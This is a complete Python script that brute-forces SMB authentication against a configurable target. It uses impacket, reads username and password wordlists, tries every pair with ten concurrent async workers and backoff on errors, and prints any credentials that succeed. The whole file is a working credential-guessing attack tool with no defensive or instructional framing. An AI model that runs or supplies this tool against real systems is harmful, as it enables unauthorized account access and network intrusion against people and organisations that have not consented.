import asyncio
import errno
from impacket.smbconnection import SMBConnection

# Target configuration
TARGET = 'Put IP here'
PORT = 445  # SMB default port

# Files containing possible usernames and passwords
USERNAME_FILE = 'Usernames.txt'
PASSWORD_FILE = 'Passwords.txt'

# Concurrency and retry settings
MAX_WORKERS = 10  # Limit the number of concurrent workers to avoid socket exhaustion
MAX_RETRIES = 5   # Number of retries for each credential pair

async def try_login(username, password, retries=MAX_RETRIES):
    """
    Attempt to authenticate to the SMB server using provided credentials.
    Retries on resource exhaustion errors (EMFILE = too many open files).
    """
    delay = 0.5
    for attempt in range(retries):
        try:
            # Run the blocking SMB login in a separate thread to avoid blocking the event loop
            def smb_try():
                conn = SMBConnection(TARGET, TARGET, timeout=5)
                conn.login(username, password)
                conn.logoff()
            await asyncio.to_thread(smb_try)
            print(f"[+] SUCCESS: {username}:{password}")
            return True
        except OSError as e:
            # Handle too many open files error by backing off and retrying
            if e.errno == errno.EMFILE:
                print(f"[!] EMFILE on {username}:{password}. Retry {attempt+1} in {delay:.1f}s")
                await asyncio.sleep(delay)
                delay *= 2  # Exponential backoff
                continue
            else:
                print(f"[-] Failed: {username}:{password} - {e}")
                return False
        except Exception as e:
            print(f"[-] Failed: {username}:{password} - {e}")
            return False
    print(f"[x] Giving up on {username}:{password} after {retries} retries.")
    return False

async def worker(name, queue):
    """
    Worker task that pulls credential pairs from the queue and attempts authentication.
    Exits when it receives a None item.
    """
    while True:
        item = await queue.get()
        if item is None:
            break  # Sentinel value to shut down the worker
        username, password = item
        await try_login(username, password)
        queue.task_done()

async def main():
    """
    Main function to set up the credential queue and spawn worker tasks.
    """
    queue = asyncio.Queue()
    workers = []

    # Load username and password lists from files
    with open(USERNAME_FILE) as uf:
        usernames = [line.strip() for line in uf if line.strip()]
    with open(PASSWORD_FILE) as pf:
        passwords = [line.strip() for line in pf if line.strip()]

    # Enqueue all username/password combinations
    for username in usernames:
        for password in passwords:
            await queue.put((username, password))

    # Start worker tasks
    for i in range(MAX_WORKERS):
        task = asyncio.create_task(worker(f"worker-{i}", queue))
        workers.append(task)

    await queue.join()  # Wait until all items have been processed

    # Stop worker tasks by sending sentinel values
    for _ in range(MAX_WORKERS):
        await queue.put(None)
    for task in workers:
        await task

if __name__ == "__main__":
    asyncio.run(main())